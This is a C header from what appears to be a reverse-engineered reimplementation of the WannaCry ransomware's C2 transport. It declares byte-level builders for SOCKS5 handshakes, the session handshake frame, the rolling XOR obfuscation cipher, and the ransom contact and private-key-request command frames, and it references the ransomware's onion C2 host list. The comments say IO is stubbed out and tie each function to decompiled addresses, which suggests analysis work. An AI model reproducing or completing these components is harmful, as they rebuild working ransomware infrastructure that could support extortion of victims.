// c2_protocol.h — pure byte-structure builders for the u.wnry C2 transport
// (function_map.md S3, REVIEW.md claims 2/3/4/5/6/7/8/15).
//
// NOTHING here performs IO: every function assembles protocol frames in
// caller-provided memory buffers. The original's socket connects, Tor
// bootstrap, and .dky writes are stubbed in weaponized_stubs.cpp.
#ifndef WCRY_C2_PROTOCOL_H
#define WCRY_C2_PROTOCOL_H

#include "wcry_types.h"

// ---------------------------------------------------------------------------
// RFC1071 ones-complement checksum — FUN_00412b00 (REVIEW claim 7):
// u16 little-endian pair sum, odd tail byte, fold, complement.
// ---------------------------------------------------------------------------
u16 wcry_rfc1071_checksum(const u8 *p, u32 len);

// ---------------------------------------------------------------------------
// SOCKS5 handshake bytes — FUN_0040d8c0 (REVIEW claim 2).
// Greeting: 05 01 00. CONNECT (domain variant): 05 01 00 03 | len | host |
// port big-endian. IPv4 variant: 05 01 00 01 | 4B | port BE.
// Builders only — never connect.
// ---------------------------------------------------------------------------
int wcry_socks5_greeting(u8 out[3]);                                   // -> 3
int wcry_socks5_connect_domain(u8 *out, u32 cap,
                               const char *host, u16 port);            // -> len
int wcry_socks5_connect_ipv4(u8 *out, u32 cap,
                             const u8 ip[4], u16 port);                // -> 10

// ---------------------------------------------------------------------------
// C2 session handshake frame — FUN_0040d0a0 (REVIEW claim 5):
//   [padLen .. padLen+30]  session key, 31 bytes of rand()%200
//   [n+31] cmd1, [n+32] 0x00, [n+33] cmd2
//   [n+34..35] RFC1071 checksum over the 31 key bytes, little-endian store
// total frame = padLen + 36 ("send n+36"; session key = blob[n..n+30]).
// Writes the generated key to key31_out when non-NULL. Returns frame length
// or negative on capacity error. srand() is the caller's business.
// ---------------------------------------------------------------------------
int wcry_handshake_frame(u8 *out, u32 cap, u8 cmd1, u8 cmd2,
                         u32 padLen, u8 key31_out[31]);

// ---------------------------------------------------------------------------
// Rolling XOR obfuscation — FUN_0040d2b0 (REVIEW claim 6), self-inverse per
// direction with its own evolving key state. key[] models the original object
// at +8: sliding window key[0..0x1D] (30 B) + current byte key[0x1E];
// feedback taps: current=key[0x1E] (obj +0x26), peer=key[0x0B] (obj +0x13).
// ---------------------------------------------------------------------------
void wcry_xor_crypt(u8 key[31], u8 *buf, int len);

// ---------------------------------------------------------------------------
// Payment/contact command frames — ProtoConnect header FUN_0040bed0
// (REVIEW claim 15, repaired: the 8-byte install id IS written first):
//   id(8, LE) | computername | cmd(1) | username
// Command payloads (decryptor.cpp FUN_0040c060/c240/c4f0):
//   0x0B contact message: + message text
//   0x0C request private key: + "%08X.dky" name, 4B zero, "WanaCrypt0r", "",
//        blob len (4B LE), .pky blob bytes
//   0x0D request attacker reply: + message text
// Success marker on any reply: first byte 0x07 (REVIEW claim 9).
// ---------------------------------------------------------------------------
typedef struct {
    u8 *buf;
    u32 used;
    u32 cap;
} wcry_frame_t;

void wcry_frame_init(wcry_frame_t *f);            // 4 KB inline-equivalent start
void wcry_frame_free(wcry_frame_t *f);
void wcry_frame_write(wcry_frame_t *f, const void *data, u32 len);
void wcry_frame_write_str(wcry_frame_t *f, const char *s);   // no NUL, FUN_0040dd00

int wcry_frame_cmd_0B(wcry_frame_t *f, u64 installId, const char *computer,
                      const char *user, const char *msg);
int wcry_frame_cmd_0C(wcry_frame_t *f, u64 installId, const char *computer,
                      const char *user, const char *dkyName,
                      const u8 *pkyBlob, u32 pkyLen);
int wcry_frame_cmd_0D(wcry_frame_t *f, u64 installId, const char *computer,
                      const char *user, const char *msg);

// ---------------------------------------------------------------------------
// Onion list parser — c.wnry onions field @0xE0 (REVIEW claim 4 / NIT 1):
// 4 NUL bytes lead-in, then ';'-joined host list; strtok set ",;" @0x421520
// (FUN_0040baf0: token[0] is the primary). out[] entries are NUL-terminated.
// Returns the number parsed (max maxOut).
// ---------------------------------------------------------------------------
int wcry_onions_parse(const u8 *field, u32 fieldLen,
                      char (*out)[64], int maxOut);

// Validated 5-onion set from c.wnry (reference data, literal @0xE4):
extern const char WCRY_C2_ONION_LIST[];

#endif // WCRY_C2_PROTOCOL_H
